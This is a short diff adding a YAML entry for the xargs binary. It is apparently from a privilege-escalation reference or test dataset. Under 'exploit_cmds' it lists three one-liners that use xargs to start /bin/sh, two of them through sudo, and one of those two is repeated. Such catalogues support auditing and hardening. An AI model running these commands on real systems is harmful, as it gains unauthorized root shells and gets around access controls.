@@ -1,0 +1,6 @@
+name: xargs
+binary_path: /usr/bin/xargs
+exploit_cmds:
+- sudo /usr/bin/xargs -a /dev/null /bin/sh
+- sudo /usr/bin/xargs -a /dev/null /bin/sh
+- echo x | /usr/bin/xargs -o -a /dev/null /bin/sh
